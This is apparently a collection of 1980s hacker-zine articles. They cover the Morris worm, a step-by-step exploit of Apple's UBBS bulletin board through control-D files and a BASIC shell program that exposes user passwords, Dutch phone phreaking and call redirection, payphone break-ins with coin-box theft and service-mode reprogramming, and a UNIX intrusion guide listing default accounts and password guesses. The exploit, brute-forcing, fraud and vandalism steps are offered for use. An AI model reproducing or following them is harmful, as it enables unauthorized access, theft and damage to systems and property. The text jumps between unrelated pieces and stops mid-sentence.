imbedded.  The "obvious" passwords are stored with their high bit set.

Although it spreads very fast, it is somewhat slowed down by the fact
that it drives the load average up on the machine - this is due to all
the encryptions going on, and the large number of incoming worms from
other machines.

[Initially, the fastest defense against the worm is is to create a
directory called /usr/tmp/sh.  The script that creates /usr/tmp/sh
from one of the .o files checks to see if /usr/tmp/sh exists, but not
to see if it's a directory.  This fix is known as 'the condom'.]


NOW WHAT?

None of the ULowell machines were hit by the worm.  When BBN staffers
found their systems infected, they cut themselves off from all other
hosts.  Since our connection to the Internet is through BBN, we were
cut off as well.  Before we were cut off, I received mail about the
sendmail problem and installed a patch to disable the feature the worm
uses to get in through sendmail.  I had made local modifications to
fingerd which changed the offsets, so any attempt to scribble over the
stack would probably have ended up in a core dump.

Most Internet systems running 4.3BSD or SunOS have installed the
necessary patches to close the holes and have rejoined the Internet.
As you would expect, there is a renewed interest in system/network
security, finding and plugging holes, and speculation over what
will happen to the worm's creator.

If you haven't read or watched the news, various log files have named
the responsible person as Robert Morris Jr., a 23-year old doctoral
student at Cornell.  His father is head of the National Computer
Security Center, the NSA's public effort in computer security, and has
lectured widely on security aspects of UNIX.

Associates of the student claim the worm was a 'mistake' - that he
intended to unleash it but it was not supposed to move so quickly or
spread so much.  His goal (from what I understand) was to have a
program 'live' within the Internet.  If the reports that he intended
it to spread slowly are true, then it's possible that the bytes sent
to ernie.berkeley.edu were intended to monitor the spread of the
worm.  Some news reports mentioned that he panicked when, via some
"monitoring mechanism" he saw how fast it had propagated.

A source inside DEC reports that although the worm didn't make much
progress there, it was sighted on several machines that wouldn't be
on its normal propagation path, i.e. not gateways and not on the same
subnet.  These machines are not reachable from the outside.  Morris
was a summer intern at DEC in '87.  He might have included names or
addresses he remembered as targets for infesting hidden internal
networks.  Most of the DEC machines in question belong to the group he
worked in.

The final word has not been written - I don't think the FBI have even
met with this guy yet.  It will be interesting to see what happens.

                    Defeating Security on Apple's UBBS
                    ----------------------------------
                       Writen by Evil Mind of CTG
                       Computer Terrorists Guild


Introduction
-------------

   Hello fellow hackers are phreakers, I'm here to tell you all about Apple's
UBBS.  This is a nice little program that will make any Apple computer with a
modem have the ability to be a bbs.  It can be on any storage device, from
a 5.25 disk, to a chain of hard drives.  I doubt any hackers or phreakers are
using this program, because everyone (in Apple's world) uses GBBS.  So, let's
get down to business.

   For flexability, UBBS has been written in BASIC.  For our convience, hackers
with a knowledge of universial basic (or better yet, knowledge of Apple BASIC)
will have a good time.  The only catch is, the control-c (break basic programs)
is screened out by a ml routine before it hits basic.  But, no need to fear,
discussion on hacking it is later.

   When a sysop first uses a UBBS program, the sysop must run the program
SYSGEN.... which is for System Generation, the "Creator Program" for the
board.  Questions are name of board, sysop's name, bullitin's names,
and other things needed before the next program is run: LOGON... which will
then put the computer in answer mode.

   Let's say some guy calls a few days later.  The LOGON program will then
display a bbs title, then something like "Enter your name or press <RETURN>
for NEW."  So, this guy does a <RETURN> for new... questions are asked, and
then the sysop validates him.  Normal procedure like any other bbs program.

Hacking it
-----------

   Once in the system, get access to the <F>eatures section which hopefully
has a up/downloading section.  If they give a lame excuse of not giving
it to you because of an IBM, lie in the validation part, and say you own an
Apple.  First, upload some text file... like a list of bbs numbers.  If the
file needs to be validated by the sysop before further access from the public,
then it will be hard to hack it out. (Explained later.)

   Now, at least you have some access... hopefully the u/d ratio is 1:1 or
better.  So, upload two more files!

File #1
--------

   This is the most important file in the hacking process.  This file should
contain the following or simular to it: (<CR>=<RETURN>) This is a TEXT file.

------------------------------------------------------------------------------

THIS IS A POEM<CR>
<CR>
<Control-D>CAT<CR>
RAT<CR>
DOG<CR>
PAT<CR>
<CR>
BY MR. WALTHER<CR>

------------------------------------------------------------------------------

File explained:

Well, the control D is needed.  If you can't enter it from your word processor,
then enter "DCAT" and go in with a disk editor and change character D into
hex $04, which is a control-d to Apple. Normally, control-d is within programs,
used to run disk commands from basic.  When viewed, it will catalog the
current storage device (hard, 3.5, or 5.25) and will be stuck in a "zombie"
mode.  Also, when downloading this file, view it, don't use Xmodem. But upload
file #2 with it, so you can hack in one call and delete your tracks.


File #2
--------

   Well, this program is supposed to be basic, but since a lot of hackers I
know have IBM's, I'll make it hackable from both Apple and IBM.  Make the
following TEXT, that's right, text file.

------------------------------------------------------------------------------

10 ONERR GOTO 1000
20 HOME
30 PRINT "A DISK PREFIXER"
40 PRINT
50 PRINT "<P>REFIX   <C>ATALOG   <V>IEW   <D>ELETE   <R>UN"
60 INPUT A$
70 IF A$<>"P" OR A$<>"p" THEN 100
80 PRINT "PREFIX WHAT? (RETURN FOR LIST, OR FOLLOW EXAMPLE: /HARD1/BBS"
90 INPUT A$: PRINT CHR$(4);"PREFIX ";A$: GOTO 40
100 IF A$<>"C" OR A$<>"c" THEN 120
110 PRINT CHR$(4);"CATALOG": GOTO 40
120 IF A$<>"D" OR A$<>"d" THEN 150
130 PRINT "DELETE WHAT FILE?"
140 INPUT A$: PRINT CHR$(4);"DELETE ";A$: GOTO 40
150 IF A$<>"R" OR A$<>"r" THEN 180
160 PRINT "RUN WHICH FILE?"
170 INPUT A$: PRINT CHR$(4);"RUN ";A$: GOTO 40
180 IF A$<>"V" AND A$<>"v" THEN PRINT "NOT A COMMAND": GOTO 40
190 PRINT "VIEW WHICH FILE?"
200 INPUT A$: PRINT CHR$(4);"OPEN ";A$: PRINT CHR$(4);"READ ";A$
210 ONERR GOTO 230
220 INPUT B$: PRINT B$: GOTO 220
230 PRINT CHR$(4);"CLOSE ";A$: ONERR GOTO 1000
240 GOTO 40
1000 PRINT "ERROR!": CALL -1370

------------------------------------------------------------------------------

   Upload the files.  When asked about file #2, say it's a TXT file.

   Now view file #1.  It will catalog (or DIR) the disk,
and then be in a "zombie" state.  This is when the basic thinks the disk is
still being read, and is really stuck, for you to enter things.  To clear that
up, the INPUT command is used both for keyboard input, or in the correct
conditions (that UBBS uses), disk input from text files!

   If you can't see it yet, press a control-D and a disk command.  The real
intention is to run file #2, which will do the hacking.  But, File#2 and
File#1 might be in a different directory than the transfer program.  Use
these commands: (With a control-D before them)

CAT             to see what is on the disk.

Example:

]CAT

/HARD1        (PREFIX NAME)

PROGRAMS          DIR   10-NOV-88  2
PRODOS            SYS   06-APR-81  32
BASIC.SYSTEM      SYS   07-APR-81  20
BASIC.PROGRAMS    BAS   10-NOV-88  5
ML.PROGRAMS       BIN   10-NOV-88  7
READ.ME           TXT   10-NOV-88  10

   In which case, should explore further with a

]PREFIX /HARD1/PROGRAMS
]CAT

/HARD1/PROGRAMS

LOGON             BAS   10-APR-84  54
SYSOP             BAS   10-APR-84  34

   Once you explore enough to fine your files, do an:

]EXEC file#2

   Replace "file#2" with whatever you named the second file.
Note: exploring will take a long time, because you might need to find some
other things to intrest you, like the logon program (which can be in another
directory). When exploring in the zombie state, the computer sometimes zaps out
back into normal running mode.  Re-download and start where you left off.

Then it'll go:

A DISK PREFIXER

<P>REFIX   <C>ATALOG   <D>ELETE   <V>IEW   <R>UN
?

   Then enter the desired one, in this case, "P" and press enter.
Here's how to work them:

Examples: from basic

]PREFIX /HARD1/FILES   (to get to the diectory /hard1/files)
]PREFIX /HARD1/        (to get back to /hard1)
]PREFIX                (tells you what the current prefix is)
]CATALOG               (DIR a disk for you)
]RUN LOGON             (Go back to LOGON program)

   View is a different thing, and can't be done from basic.  In this case,
choose "V" for view, (beforehand, find the userinfo file, a text file.)
And when it goes:

VIEW WHICH FILE?
?

type in a pathname.... example:

VIEW WHICH FILE?
?/HARD1/BBS/USERINFO.DATA

and it'll show the passwords.  Explore!  There are a lot of things to do.  One
last word before you finish, the sysop is 001, find his password, log in as
him, then make all your accounts from there (because he validates and creates
accounts.)

   The form for UBBS passwords are:

NNNCCCC   where N is a number, and C is a character.
example: 001SYSOP.  Also, 001SYSOP is the default password? (I'm not sure, but
I think it is.)  Try it on a new board and see if the sysop didn't change it
yet.

So if your victim board doesn't have the requirements, just use a password
scanner and try out 001AAAA   001AAAB and all, and eventually you can get it
in a matter of weeks.  (No lowercase or control characters are accepted by
UBBS.)

All in a nutshell, here's another example:

------------------------------------------------------------------------------

Welcome to a UBBS system.

Enter name or press return for new users
XXXXXXX
checking password.
Hello Mr. Bill, today is 00/00/00

news for today:

               This is a new board and hope ya enjoy it,
                Your sysop, Tom Hacket.

                   Hacking In Holand & The Numbering Plan
                   --------------------------------------
                            By: Rop and The Key


    In Holland, hacking started out late. The first real hacks were
done in the early eighties. Among these hacks was the 'RIVM hack',
hacking the computer of the dutch health-inspection (FDA). Because
even patient names were listed here this got a lot of publicity.

    Around 1984/1985 the movement grew rapidly because of the movie
'Wargames' and publications in the "Volkskrant", the country's major
left-wing newspaper. It was around these days two students hacked the
'008 computer', the directory-assistance system, owned by our local
Ma-Bell clone, the PTT. Because hackers had access to a lot of
unlisted phone numbers this was front-page news in all of Europe.

Shortly after this hack, Jan Jacobs published the book 'kraken en
computers' (hacking and computers), about the uprise of the hacker
movement in The Netherlands. Jan Jacobs is also a free-lance reporter
for the 'Volkskrant' which explains their scoops on major hacking
events. In those days, he himself was a hacker.

Things remained relatively quiet, although the CCC kept scaring
everybody with their marvelous hacks all over the world over the
packet-network. X-25 hacking in Holland is relatively new, not because
the net was not there, but because it was still to easy to use the
telephone. Only recently dutch hackers discover that the X-25 net
offers them the opportunity to make low-cost global hacks.

Another group had sprung into life in the early eighties, phreaks.
These phreaks concentrated on mobile phones however, because our ATF1
(car-phone 1) system is as leak as a basket. Using a CBM-64 or other
simple hardware and an FM-tranceiver, every weirdo could make free
calls all over the world. This lasted until there were so many illegal
car-phones that the costs began affecting the total PTT turnover.

The PTT then made it impossible for car-phone users to make
international phone calls automatically and told their international
operators to check for fraud carefully. By that time all the phreaks
were rich from selling their technique 'to friends only', and bored
stiff, because the PTT had taken their toy away. There was a new
system, ATF2 (compatible to the scandinavian NMT system), but this was
to complicated (in those days) to hack (considdering these people were
not computer minds but mainly high-frequency experts).

The phreaks met the hackers and they decided their goels were the
same.

The PTT phreaked out when the world found out that some of the leading
hackers had switched to phreaking. When Personal Computer Magazine
published an article about phreaks making free calls all over the
world through an old exchange in Denmark (which could be reached free
of charge), all hell broke loose. The magazine contained our list of
frequencies for the CCITT-4 system, so suddenly everybody was a
phonephreak. The free lines to Denmark were rerouted, some other gaps
were closed, but no action could be taken against the phone phreaks
(The Key and me among others), because no phone-fraud legislation
exists in Holland. Can you imagine what it's like to live in a country
that has NO phone-fraud laws?

Since then things have cooled down (there are only about 40 real
active hackers in the entire country, so things tend to get quiet
every once in a while), but as soon as anything happens, we'll let you
know.

---------------------------------------------------------------------------
- AND NOW PART TWO OF THE DUTCH SYSTEM, BY ROP & THE KEY OF NEABBS !!!!!!!-
---------------------------------------------------------------------------

NUMBERING PLAN

The dutch phone system has a numbering plan that is far more
complicated than the american phone system. Telephone numbers can be
divided in several classes:

0XX-YYYYYY[Y]    Larger cities. XX is random (very large cities
                 have a 0 as their last digit).

0XXYY-ZZZZ[Z]    Smaller towns. XX is the number of the district
                 (note: these numbers cannot be handed out to
                 bigger cities). Holland has some 20 districts,
                 amsterdam is 29. (the Amsterdam city code is 020)

00X
001X             Special numbers, see below.

    06-0XXX         Free numbers
    06-0XXXXXX      Free numbers
        06-022XXXX      International Free Numbers, connect to foreign
                        companies etc. (we even have a number for
                        making AT&T calling card calls for free,
                        06-0229111). When all european borders
                        disappear in 1992, this group is expected to
                        grow rapidly!
    06-3XXXXXXXX    Special high cost numbers, mainly phone-sex (the
                    owner gets 2.5 $ct./min, the PTT gets 22.5. This
                    makes the PTT the country's biggest pimp)
    06-4XXX         Free numbers, explosive. (This means a lot of
                    traffic at one time, TV-shows and the like)
    06-4XXXXXX      Free numbers, explosive.
    06-51XXXXX      Beepers (sorry, paging equipment)
    06-52XXXXXX     ATF2 (mobile phone system, NMT compatible)
    06-524XXXXX     ATF1, West and Middle Netherlands
    06-525XXXXX     ATF1, North Netherlands
    06-526XXXXX     ATF1, South Netherlands
    06-8XXXXXXXX    Split costs, the caller pays a portion of the
                    costs, the called party pays as well (80%+80%=100%
                    according to phone company arithmatic)
    06-9XXXXXXXX    Special high cost numbers, no phone-sex

09-.......          International access. For the States i.e., we dial
                    09-1XXXYYYZZZZ. Our country code is 31.


SPECIAL NUMBERS
---------------

002              Speaking clock
003              Weather
004              PTT-customer service (contradictio in terminis)
005              was the mobilophone network (pre-carphone mobile
                 operator service), now tape telling callers that this
                 service no longer exists.
006X             Used by PTT for mechanics to call in. 0069 always
                 plays a tape listing the home-phone number of the
                 mechanic on duty for that region.
007              PTT-repairs (uses pigeons for further internal
                 communication, judged by their working speed)
008              Directory assistance
009              Was message service, for telex and other services,
                 their new number is 06-0409. tape.
0010             Was national operator, now 06-0410. tape.
0011             Once planned as a countrywide emergency number. Once
                 they got to installing it they had the 06 exchange,
                 which was newer and better, so the discussion started
                 again...... tape now
0012             Telex number info
0013             Telex repairs
0014
0015
0016             Was international operator, now 06-0410. tape.
0017             Post office customer service
0018             Was international inquiries, now 06-0418. tape
0019             Dead


TARIFFS
-------

A toll-impulse costs 7.5 $ct, impulses are 50 Hz/48V pulses on both
lines (tip and ring, called A and B here), so can only be detected
relative to the ground potential. On modern exchanges you have to pay
for these pulses, as well as for the DTMF-facility (sound familiar?).

Calls cost more in the day time (0800/1800 hrs), than on weekdays.

Within your low-tariff zone (about 30 miles around your home), it's
one tick every 5 minutes, or once every 10 minutes at night, outside
of that zone one tick every 1.5 minutes, 45 seconds at night.

International calls from Holland are terribly expensive, USA costs
$2.00 a minute, but there's a lot of countries that cost over $3.50 a
minute.


SPECIAL THINGS (everybody has some)
--------------

030-555555    for conference calls (operator only, she calls you back,
              so phreaks are out of the question). The do-it-yourself
              conference has not been invented here (yet).
06-0101       All sorts of special services, addresses from the phone
              book (costs $1.25 to get an address!) etc. Also national
              collect calls ($2.50 bonus for PTT, $1/min)

*XXX*.....#   Some exchanges have this feature. It means you redirect
              all calls for your phone to the given number (dots). PTT
              offers this service for a lot of money as *21*....#, but
              this is different. With the *XXX*...# feature the phone
              doesn't ring on the redirected phone (with the *21
              feature it does three times before forwarding the call).
              The *XXX*....# feature is a non documented feature, even
              at the PTT not many people have heard of it. Alas, not
              many exchanges feature it. The XXX can easily be found
              because if you're one digit off the system reacts with a
              nonexistent-tone (three tones, each one higher than the
              preceeding one), so there's only 30 possibilities.

Things like call-waiting, or even specified bills do not exist here
(yet). When they come, they'll be expensive, that's for sure.

PTT POLICY
----------

The company has a monopoly on all telecom facilities that expires next
year (1989). Up till now we could not even buy our telephone sets
somewhere else (legally). People finally realised this was ridiculous
and decided to privatise the PTT Telecommunications department. The
PTT remains in charge of the network however, and they can continue
charging ridiculous amounts for it. The state monopoly is enabling the
phone company to suck money from our pockets.


HACKER POLICY
-------------

Redirect phone lines to other numbers (they don't even know it exists,
we do it all the time, to receive free collect calls). This trick
courtesy of The KEY.

Route calls through other countries to make things cheaper. (Spain was
our favourite before they closed it off).

Generally screw 'em......

                          Third Party Payphones
                          ---------------------
                              By: The Jedi



Theres been alot of discussion lately about paperclipping and redboxing on
payphones so I decided to write up an article about that subject to be
included in this issue of PHUN. Here are a few things that you'd might find
interesting about payphones....

NOTE: All the payphones discussed in this article refer to Non-New York
      Telephone PayPhones. There are plenty of third party payphones in New
      York. The easiest way to tell if the payphone is from New York Tel is to
      look right under the keypad where is says what numbers to dial for
      information. All New York Payphones will have their Logo printed
      somewhere on that label. If it isn't New York Tel, there will be a
      company name and number listed to call for refunds. Thats the company
      that owns and operates that perticular payphone.



2 - Ripping off the handsets. Now exactly the best way to phuck over the phone
    company but still is fun if you have nothing else to do. Just take a pair
    of pliers, grip them, and turn the opposite direction of the way that the
    steel is woven. This will expose the wires. Cut the wires, and bring your
    handset home with you!!

3 - Breaking into the jack. From what I've seen by repairing payphones, all
    the ones that I've seen have a regular phone jack somewhere in the
    fortress or nearby. This allows you do do a great many things. First lets
    talk about the jack's location.

      The fortress phones that have those big green walls to then are the
    easiest ones to get into. The location of the jack is in the "Stem". Right
    about Knee high there should be a green plate with 6 or so wierd looking
    screws holding it in place. To get that panel off requires a special
    screwdriver. Somewhat like a "Allen Wrench" with a little hole in the
    middle. You can probably pick up a screwdriver like this in most hardware
    stores.
      On the fortress phones that are silver and skinny, the jack is usually
    location in the ground underneath cement. Don't even bother with them.
      On payphones located inside stores, just follow the two wires coming out
    of the phone, it should lead to a beige box with a lock on it. Pick the
    lock or break open the box and you'll see the jack.

      Ok, now that you're into the jack, you can dial anywhere you'd like to.
    Remember, that phone jack is almost exactly like the jack you have in your
    house. Just pick up a cheap $5 phone from radio shack [A small one
    preferrably since you dont want to look obvious] and hook it in! By doing
    this, you're bypassing all the security of the phone [etc...Please Deposit
    .10 cents for the next XX mins.].

4 - Get the Coin Box! Not that easy but one of my friends managed to bring
    home a parking meter so it IS possible!! Theres two locks you must get
    past in order to get to the coin box. First, get a piece of metal and make
    the following.....

                        ___
                      __| |__
                     |__   __|<===-- about 1/4 of an inch
                        | |
                ________| |________
               /                   X
               |                   |
               X___________________/

      This key will allow you to get past the lock in the front of the
    payphone. Ok, pick the lock on the bottom left-hand side of the payphone
    [or drill a hole in it] and then put that key in the front lock and turn
    it clockwise [to the right for those of you that can't tell time! heh].
    Pull out the coin box and go and play 2000 video games!! Each coin box
    holds up to a maximum of $150-175 dollars.

5 - Reprogramming the payphone. The most fun thing and also most dangerous!
    First off, these aren't the stupid NY Telephones, they will call back the
    company automatically if you dont do this correctly! All of the phones
    that I work on have burnt-in Eproms that are for service. You can do
    things like.....

    A) Change the refunds number. This is a number to get in touch with the
    company that operates the phone and get a refund sent to you by mail. When
    you dial it, you won't have to put in a quarter for the call. Now, if you
    can change that number to whatever you'd like, you can make a free phone
    call from that phone anytime you want!

    B) See how much money is in the coin box. You don't want to waste your
    time if theres only $5 in there do you?? You can also erase that amount,
    making it a pain in the ass for the technician who now must count it out
    himself!

    C) Theres a couple of other things in there that I haven't found out about
    yet but as soon as I do, they'll be in the next issue fer sure!

    Ok, the lock for this is either in two places. Check the top of the
    payphone, if theres a lock there, thats the one that you want. It's called
    a service lock. If it isn't there, check the right-hand side of the
    payphone. If it's there, you'll need that key that you've made also. Pick
    the top lock and use the key for the one underneath it.  Once you do that,
    you should get one of the following....

       1 - If the payphone has a LCD Display on it, you'll see a menu
           displaying the following...

              Service Mode:

           Now you'll have to hack out the code. It's usually four digits so
           it should take too long. I'm not about to list the ones that I have
           because I know some asshole will wind up trashing my phones!!!

             Theres a few codes that are possible and each do different
           things. For instance, one code will give you access to the coin box
           counts and test modes while another will give you access to
           programming the emergency numbers and refund numbers. Be sure NOT
           to go into the payphone test mode!! This is cause the payphone to
           display

                PHONE SELF-TEST: Please Do Not Use.

             What happens here is that the phone calls up the company that
           operates the payphone and tells whoever picks up the phone, the
           amount that is in the coin box and whatever thats being do to the
           phone! You're asking for trouble with this mode.


       2 - If there is no display, listen to the handset. A voice will prompt
           you to enter your service entry. It works exactly the same way as
           the LCD Display but just with a voice.

       3 - Either way, once the lock is turned back into the original position,
           the phone will go into self-test mode. The way to get around this
           is to open up the phone. Just pull the front end of the phone
           towards you, this will release half of the phone. Find the power
           supply board. On some models, it will have the power supply on the
           main board [The one standing upright], on others, the power supply
           will have it's own separate board located underneath the main board
           and coin mech. You'll notice which ever section that has a
           transformer on it, thats what I'm talking about. Ok, there should
           be a little orange switch there. If you pull in out, that will turn
           the phone off. Pushing it in will turn the phone back on again. If
           you pull it out and then push it in again, the phone will do a quick
           check of itself [about 3-5 seconds]. Now, put the front end of the
           phone back onto the fortress and turn the service key quickly. If
           you do this quick enough, the phone won't have a chance to go into
           service mode or self-test. It'll be like you never broke into it in
           the first place!

6 - Once you get past the service lock. You can now get inside the payphone
    itself. Pull the front end of the payphone towards you, then lift. Inside
    you'll see various electronic boards, a coin mech, etc... On some models,
    you'll also have a modular cable coming in from the jack, hook up your
    portable phone to it and dial up! Trash the boards, take some home. Thats
    where the real damage comes in! The average payphone costs about $1,200 to
    1,500 bucks and most of that is because of whats inside, not the fortress
    itself.

7 - On most payphones that are in stores, they'll be a couple of wires coming
    out of it. If the phone was hooked up sloppy, they'll be exposed. One wire
    is for power, the other goes to the jack. Cut them or pull out the jack.
    Everyone that puts money into it afterwards will lose it!

8 - On the Intellical and Echotel payphones, theres a special feature that
    will allow the owner of the phone to log into it remotely from a computer.
    As of now, I don't have the exact information on how to break into it
    through modeming but I do know that it is definately possible! Once you
    login, you'll be able to reprogram the rate tables. A rate table is a
    eprom that contains all the information on the rates for calls such as how
    much it costs to call long distance and the amount of time per call thats
    allowed. If you're able to reprogram the rate table, you'll be able to
    make free phone calls anywhere for an unlimited amount of time. As soon as
    I figure out how to crack the program thats used to call in, I'll write
    the information in the next issue. Stay tuned!


 Well, that should be enough for all you guyz to have fun. The next issue will
have a detailed explanation on how the payphone itself operates and whatever
else I might find out that interesting. Until then, if you have any questions,
you can leave me some email.

Brief history on UNIX
----------------------
Its because of Ken Tompson that today were able to Hack Unix.He used to work
for Bell Labs in the 60s.Tompson started out using the MULTICS OS which was
later eliminated and Tompson was left without an operating system to work with.
Tompson had to come up with something real quick.He did some research and
and in 1969 UNIX came out,which was a single user and it didn't have
many capabilities.A combined effort with others he rewrote the version
in C and added some good features.This version was out in 1973 and was
available to the public.This was the first begining of UNIX as its known
presently.The more refined version of UNIX,today know as UNIX system V
developed by Berkley University has unique capabilities.
Various types of UNIXes are CPIX,Berkeley Ver 4.1,Berkeley 4.2,FOS,Genix,HP-UX,
IS/I,OSx,PC-IX,PERPOS,Sys3,Ultrix,Zeus,Xenix,UNITY,VENIX,UTS,Unisys,Uniplus+,
UNOS,Idris,QNIX,Coherent,Cromix,System III,System 7,Sixth edition.

The article it self:
--------------------
I believe that hacking into any system requires knowledge of the Operating
system itself.Basically what I will try to do is make you more familiar with
UNIX  operation ,its usefull commands that will be advantageous to you as a
hacker.This article contains in depth explainations.

Error Messages that one may came across:[UNIX system V]
----------------------------------------
Login incorrect - An ivalid ID and/or pw was entered.This means nothing.
                  In UNIX there is no way guessing valid user IDs.You may
                  come across this one when trying to get in.
No more logins - will happens when the system wont accept anymore logins
                 could be going down
Unknown Id - will happen if an ivalid id is entered using (su) command
Unexpected eof in file - The file being stripped file has been damaged
Your password has expired - This is quiet rare although there have been cases
                            where it happened.Reading the etc/passwd will
                            show you at how many intervals it changes.
You may not change the password - The password has not yet aged enough.The
                                  Administrator set the quotas for the users
Unknown group [groups name] - occurs when chgrp is executed ,group doesn't
                              exist
Sorry - Indicated that you have typed in an invalid super user password(execu-
        tion of the su)
Permission denied!- Indicated you must be the owner or a super user to change
                    password.
Sorry <[# of weeks] since last change - This will happen when password has
                                        has not aged enough and you tried to
                                        change it(passwd)
[directory name]:no permission - You are trying to remove a directory which
                                 you have no permission to.
[file name] not removed - trying to delete a file owned by another user
                          that you dont have write pemision for.
[dirname] not removed - ownership of the dir is not your that your trying to
                        delete.
[dirname] not empty - the directory contains files so you must have to delete
                      the files before executing the rmdir
[command] not found - you have entered an ivalid command not know to UNIX
cant execute pwd - some thing wrong with the system cant execute pwd command
cannot chdir to .. -   (.. one level up) permision is required to execute pwd
                       above the current directory
cant open [file name] - defined wrong path,file name or you have no read
                        permission
cp:[file name] and [file name] are identical - self explanatory
cannot locate parent directory - occurs when using mv
[file name] not found - file which your trying to move doesn't exsist
You have mail - Self explanatory

Basic Networking Utility error messages
---------------------------------------
cu:not found - networking not installed
login failed - invalid id/pw or wrong # specified
dial failed - the systen never answered due to a wrong #
uucp completely failed - did not specify file after -s
wrong time to call - you called at the time at a time not specified in the
                     Systems file
system not in systems - you called a remote not in the systems file

Logon format : first thing one must do is switch to lower case
--------------
Identifing a UNIX.Here is what you'll see:
Some times there will be no system identifer

AT&T UNIX SysVR3.0 (eg of a system identifier)

login:
 or
Login:

Any of these is a UNIX.Here is where you will have to guess at a user valid
id.Here are some that I have come across eg( glr,glt,radgo,rml,chester,cat,
lom,cora,hlto,hwill,edcasey and also some containing numbers smith1,mitu6 or
special characters in it like bremer$,j#fox.Login names have to be 3 to 8
chracters in lenght lowercase and must start with a letter.In some XENIX
systems one may login as "guest"

User level accounts:(lower case)
--------------------
In Unix they have whats called accounts .These
accounts can be used at the "login:" prompt.
Here is a list:

sys
bin
trouble
daemon
uucp
nuucp
rje
lp
adm
listen - if starlan is installed

Super-user accounts:
--------------------
And then there are super-user login which make UNIX worth hacking.
The accounts are used for a specific job. In large systems these logins
are assingned to users who have a responsibilty to maintain subsystems.

They are as follows :(all lower case)

root       -  this is a must the system comes configured with it.It has no
              restriction.Has power over every other account.
unmountsys -  unmounts files
setup      -  system set up
makefsys   -  makes a new file
sysadm     -  allows useful S.A commands(doesn't need root login)
powerdown  -  powering system down
mountfsys  -  mounts files
checkfsys  -  checks file

These accounts will definitly have passwords assigned to them.These
accounts are also commands used by the system administrator.

Here are some examples of accounts I have seen:

cron         uuhelp     usenet
anonuccp     news       network
bellboy      lp         vector
guest        games      ninja
vote         warble     sysinfo



After the login prompt you will receive a password prompt:

password:
  or
Password:

Enter the password (it wont echo).The password rule is as follows:Each pw
has to contain at least 6 characters and maximum has to be 8 .Two of which are
to be alphabetic letters and at least one being a number or a special character
The alphabetic digits could be in upper case or lower case.Here are some of the
passwords that I have seen (eg.Ansuya1,PLAT00N6,uFo/78,ShAsHi..,Div417co)

The passwords for the super user accounts will be difficult to hack
try  the accounts interchangebly eg.login:sysadm password:makefsys or rje1,
sysop,sysop1,bin4 or they might contain letter,numbers,special chracters in
them.It could be anything.The user passwords are changed by an aging proccess
at successive intervals.The users are forced to changed it.The super-user
will pick a password that wont need changing for a long period of time.

You have made it!
-----------------
The hard part is over and hopefully you have hacked a super-user account.
Remember Control-d stops a process and also logs you off.
The next thing you'll probably see is the system news
eg.

login:john
password:hacker1
System news
There will be no networking offered to the users till
august 15,due to hardware problems.
(just an example)

$

$ is the Unix prompt -waiting for a command to be entered.I will use this
                      throught the article to show outouts etc..(Its not
                      part of the command)
# - means your logged in as root(very good)

A word about the XENIX System III:(run on the tandy 6000)
---------------------------------
The largest weakness in the XENIX System III occurs after the installation
of the Profile-16 or more commonly know as the filepro-16.I have seen the
filepro-16 installed in many systems.
The installation process creates an entry in the password file for a user
named XfBprofileXfR ,an account that who owns and administors the database.
The great thing about it is that when the account is created ,no password is
assigned to it.The database contains executable to maintain it.The database
creation programs perform a XfBsetuidXfR to boot up the XfBootXfR  there by
giving a person the whole C Shell to gain Super User privilege same as root.
Intresting huh!


* Note: First the article will inform you of how the Unix is made up

The Unix is made if three components-The shell,the kernal,file system.

The kernal:
-----------
You could say that the kernal is the heart of the Unix operating system.
The kernal is a low level language lower than the shell which maintains
processes .The kernal handles memory usage ,maintains file system
the sofware and hardware devices.

The shell:
----------
The shell a higher level language. The shell had two important uses,
to act as command interpreture for example using commands like cat,who,
ls the the shell is at work figuring out whether you have entered a command
correctly or not.The second most important reason for the shell is its ability
to be used as programing language.Suppose your performing some tasks
repeatedly over and over again,You can program the shell to do this for you.

The file system:
---------------
The file system in Unix is divede into 3 catagories:Directories,ordinary files
and special files.(d,-)

Basic stucture:
(/)-this is abreviation for the root dirctory.
  root level                      root
                                  (/)                                  system
-------------------------------------|----------------------------------level
|      |        |         |                  |        |       |        |
/unix   /etc    /dev      /tmp               /lib     /usr    /usr2    /bin
        |                                        _____|_____
login passwd                                     |    |    |
level                                            /john  /cathy
                             ________________________|_______________
                            |        |     |      |        |        |
                        .profile   /mail  /pers  /games   /bin     /michelle
*.profile - in case                        |    __|______  |      __|_______
 you wich to change your enviroment     capital |        | data   |         |
but after you log off.It sets to              othello  starwars letter letter1
default.

the /unix-is the kernal
/etc - contains system administrators files,Most are not available to the
       regular user.(this directory contains the /passwd file)

    Here are some files under /etc directory:
    /etc/passwd
    /etc/utmp
    /etc/adm/sulog
    /etc/motd
    /etc/group
    /etc/conf
    /etc/profile

/dev - contains files for physical devices such as printer and the disk drives
/tmp - temporary file directory
/lib - dirctory that contains programs for high level languages
/usr - this directory contains dirctories for each user on the system

     Eg. of a list of files under /usr
    /usr/tmp
    /usr/lib
    /usr/docs
    /usr/news
    /usr/spool
    /usr/spool/lp
    /usr/lib/uucp

/bin - contain executable programs (commands)

The root also contains:
/bck - used to mount a back up file system.
/install - Used to install and remove utilities
/lost+found - This is where all the removed files go,This dir is used by fsck
              (1M)
/save -A utility used to save data
/mnt - Used for temporary mounting

**Now the fun part scouting around**

                 Local commands (Explained in details)
                 -------------------------------------
At the unix prompt type the pwd command-it will show you the current working
directory you are in.

$ pwd
$ /usr/admin - assuming that you have hacked into a super user acc checkfsys
$

This gives you the full login directory.The / before tell you the location
of the root directory

or

(REFER TO THE DIAGRAM ABOVE)
$ pwd
$ /usr/john
$
Assuming you have hacked into johns acc.

Now lets say you wanted to move down to the michelle directory( you own this)
that contains letters.You would type in

$ cd michelle or cd usr/john/michelle
$ pwd
$ /usr/john/michelle
$

Going back one directory up type in:
$ cd ..
or going to your parent directory just type in "cd"

Listing file directories assuming you are in the parent directory:

$ ls /usr/john
mail
pers
games
bin
michelle
This wont give you the .profile file .To view it type
$ cd
$ ls -a
:
:
.profile

To list file names in michelles directory type in:
$ ls michelle (that if your in the johns directory)
$ ls /usr/john/michelle(parent dir)

ls -l
-----
The ls -l is an an important command in unix.This command displays the whole
directory in long format :Run this in parent directory

$ ls -l
total 60
-rwxr-x---    5 john      bluebox    10 april 9  7:04  mail
drwx------    7 john      bluebox    30 april 2  4:09  pers
     :            :         :         :     :      :    :
     :            :         :         :     :      :    :
-rwxr-x---     6 cathy    bluebox    13 april 1  13:00 partys
     :            :         :         :     :      :    :
$

The total 60 tells one the ammount of disk space used in a directory.The
